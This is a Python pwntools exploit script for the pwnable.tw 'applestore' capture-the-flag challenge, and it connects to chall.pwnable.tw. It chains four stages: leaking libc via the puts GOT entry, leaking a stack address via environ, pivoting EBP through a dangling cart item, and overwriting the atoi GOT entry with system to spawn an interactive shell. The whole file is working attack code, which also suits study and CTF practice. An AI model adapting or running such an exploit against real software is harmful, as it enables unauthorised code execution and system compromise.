#!/usr/bin/env python3

from pwn import *

exe = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        #if args.DEBUG:
        #gdb.attach(r, gdbscript='''
        #    b *checkout+75
        #    c
        #    ''')
        #input()
    else:
        r = remote("chall.pwnable.tw", 10104)

    return r


def main():
    r = conn()

    # 16 x 199 + 10 x 399
    for i in range(16):
        r.sendlineafter(b">", b"2")
        r.sendlineafter(b">", b"1")

    for i in range(10):
        r.sendlineafter(b">", b"2")
        r.sendlineafter(b">", b"4")


    ### Stage 1: Leak libc

    # Checkout
    r.sendlineafter(b">", b"5")
    r.sendlineafter(b">", b"y")
    payload = b"27"
    payload += p32(exe.got['puts'])
    payload += p32(0)
    payload += p32(0)
    payload += p32(0)

    # Delete
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b"Item Number>", payload)
    r.recvuntil(b"Remove 27:")
    libc.address = u32(r.recv(4)) - libc.sym['puts']
    print("libc: ", hex(libc.address))



    ### Stage 2: Leak stack



    payload = b"27"
    payload += p32(libc.sym['environ'])
    payload += p32(0)
    payload += p32(0)
    payload += p32(0)


    # Delete
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b"Item Number>", payload)
    r.recvuntil(b"Remove 27:")
    leak_stack = u32(r.recv(4))
    ebp = leak_stack - 0x104


    ### Stage 3: control EBP


    payload = b"27"
    payload += p32(libc.sym['environ'])
    payload += p32(0)
    payload += p32(exe.got['atoi']+0x22)
    payload += p32(ebp-0x8)

    # Delete
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b"Item Number>", payload)
    #r.recvuntil(b"Remove 27:")


    ### Stage 4: overwrite got
    payload = p32(libc.sym['system'])
    payload += b";sh;"
    payload += p32(0)
    r.sendlineafter(b">", payload)
    # good luck pwning :)
    r.interactive()


if __name__ == "__main__":
    main()
